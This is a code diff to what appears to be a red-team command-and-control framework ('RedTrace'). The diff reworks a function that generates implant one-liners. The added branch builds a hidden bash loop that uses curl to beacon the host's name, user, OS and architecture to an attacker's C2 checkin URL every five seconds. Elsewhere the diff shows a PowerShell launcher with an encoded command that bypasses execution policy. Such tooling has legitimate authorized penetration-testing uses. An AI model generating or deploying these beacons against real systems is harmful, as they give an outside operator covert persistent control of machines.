@@ -54,6 +54,28 @@ def generate_oneliner(
     kind = kind.strip().lower()
     if kind not in compatible_oneliners(metadata):
         raise ValueError(f"{ltype} 不支持 {kind}，可用类型：{', '.join(compatible_oneliners(metadata))}")
+    if kind == "curl_beacon":
+        base_url = str(metadata.get("callback_url") or "").rstrip("/")
+        if not base_url:
+            host = callback_host(metadata, host_override)
+            port = int(metadata.get("bind_port") or 0)
+            if not 1 <= port <= 65535:
+                raise ValueError("监听端口无效")
+            scheme = "https" if ltype == "https_beacon" else "http"
+            base_url = f"{scheme}://{host}:{port}"
+        checkin = f"{base_url}/c2/checkin/{listener_id}"
+        body = (
+            '{"external_id":"curl-$(hostname)","hostname":"$(hostname)",'
+            '"username":"$(whoami)","os":"$(uname -s)","arch":"$(uname -m)",'
+            '"process":"curl","capabilities":["command"]}'
+        )
+        return (
+            "bash -c 'while :; do "
+            f"curl -fsSk -H \"X-RedTrace-Listener-Token: {listener_token}\" "
+            "-H \"Content-Type: application/json\" "
+            f"-X POST \"{checkin}\" -d '\\''{body}'\\'' >/dev/null 2>&1; "
+            "sleep 5; done' &"
+        )
     host = callback_host(metadata, host_override)
     port = int(metadata.get("bind_port") or 0)
     if not 1 <= port <= 65535:
@@ -126,21 +148,7 @@ def generate_oneliner(
         encoded = base64.b64encode(script.encode("utf-16le")).decode()
         return f"powershell -NoProfile -ExecutionPolicy Bypass -EncodedCommand {encoded}"
 
-    scheme = "https" if ltype == "https_beacon" else "http"
-    base_url = str(metadata.get("callback_url") or f"{scheme}://{host}:{port}").rstrip("/")
-    checkin = f"{base_url}/c2/checkin/{listener_id}"
-    body = (
-        '{"external_id":"curl-$(hostname)","hostname":"$(hostname)",'
-        '"username":"$(whoami)","os":"$(uname -s)","arch":"$(uname -m)",'
-        '"process":"curl","capabilities":["command"]}'
-    )
-    return (
-        "bash -c 'while :; do "
-        f"curl -fsSk -H \"X-RedTrace-Listener-Token: {listener_token}\" "
-        "-H \"Content-Type: application/json\" "
-        f"-X POST \"{checkin}\" -d '\\''{body}'\\'' >/dev/null 2>&1; "
-        "sleep 5; done' &"
-    )
+    raise ValueError(f"unsupported payload kind: {kind}")
 
 
 GO_BEACON_TEMPLATE = r'''package main
@@ -273,7 +281,7 @@ def build_beacon(
         raise ValueError("目标系统仅支持 linux、windows、darwin")
     if target_arch not in {"amd64", "arm64", "386"}:
         raise ValueError("目标架构仅支持 amd64、arm64、386")
-    callback_url = callback_url.strip().rstrip("/")
+    callback_url = (callback_url.strip() or str(metadata.get("callback_url") or "")).rstrip("/")
     if not callback_url:
         host = callback_host(metadata)
         scheme = "https" if listener_type(metadata) == "https_beacon" else "http"
